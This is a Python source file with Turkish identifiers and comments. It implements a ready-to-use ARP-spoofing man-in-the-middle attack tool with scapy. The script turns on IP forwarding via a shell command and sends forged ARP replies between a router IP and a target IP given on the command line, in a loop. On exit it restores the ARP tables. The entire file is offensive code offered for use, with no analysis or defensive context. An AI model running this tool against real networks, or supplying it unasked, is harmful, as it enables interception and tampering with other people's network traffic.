from os import system as komut
import scapy.all as scapy
import argparse
import time


def macbulucu(ip):
    paket = scapy.ARP(pdst=ip,hwdst="ff:ff:ff:ff:ff:ff")
    #scapy.ls(paket)
    baslik = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    #scapy.ls(baslik)
    tam_paket = baslik/paket
    aktif = scapy.srp(tam_paket,timeout=1,verbose=False)[0]
    if len(aktif) > 0:
        return aktif[0][1].hwsrc
    else:
        macbulucu(ip)

def paket(ip1,ip2):
    mac = macbulucu(ip2)
    arp_paket = scapy.ARP(pdst=ip2,hwdst=mac,psrc=ip1)
    #scapy.ls(arp_paket)
    scapy.send(arp_paket,verbose=False)

def reset(ip1,ip2):
    mac1= macbulucu(ip2)
    mac2 = macbulucu(ip1)
    arp_paket = scapy.ARP(pdst=ip2,hwdst=mac1,psrc=ip1,hwsrc=mac2)
    scapy.send(arp_paket,verbose=False,count=5)

komut ("echo 1 > /proc/sys/net/ipv4/ip_forward")
def main():
    kullanım = argparse.ArgumentParser(description="Ortadaki Adam Saldırısı için kullanım : python ortadaki_adam_saldırısı.py -m [modem] -t [hedef]")
    kullanım.add_argument("-m","--modem",dest="modem",help="Modem ip adresi giriniz.")
    kullanım.add_argument("-t","--hedef",dest="hedef",help="Hedef ip adresi giriniz.")
    args = kullanım.parse_args()
    modem_ip = args.modem
    hedef_ip = args.hedef
    if not modem_ip or not hedef_ip:
        kullanım.print_help()
    else:
        sayac = 0
        try:
            while True:
                paket(modem_ip,hedef_ip)
                paket(hedef_ip,modem_ip)
                sayac +=2
                print("\rGönderilen paket sayısı : "+str(sayac),end="")
                #\r yi üzerine yazması için kullandık. end="" i de bir alt satıra geçmemesi için kullandık.
                time.sleep(2)
        except KeyboardInterrupt:
            print("\nÇıkış yapılıyor...")
            reset(modem_ip,hedef_ip)


if __name__=="__main__":
    main()

